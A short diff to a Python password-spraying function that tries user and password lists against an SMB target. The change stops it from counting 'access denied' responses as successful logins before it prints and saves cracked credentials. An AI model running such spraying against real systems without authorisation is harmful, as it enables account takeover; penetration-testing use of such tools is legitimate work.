@@ -73,11 +73,12 @@ def sprayer(domain, user_list, password_list, target_ip, output, bypass):
                     quit()
             # if logon fails, drop the response, any other response, print to screen and remove account from spraying
             elif answer != "session setup failed: NT_STATUS_LOGON_FAILURE\n":
-                print("The account %s was successfully logged into using the password %s" % (user, password))
-                temp_users.remove(user)
-                # write password to file
-                if output is not None:
-                    write_output(user, password, output)
+                if answer != "session setup failed: NT_STATUS_ACCESS_DENIED\n":
+                    print("The account %s was successfully logged into using the password %s" % (user, password))
+                    temp_users.remove(user)
+                    # write password to file
+                    if output is not None:
+                        write_output(user, password, output)
     print("Complete")
 
 
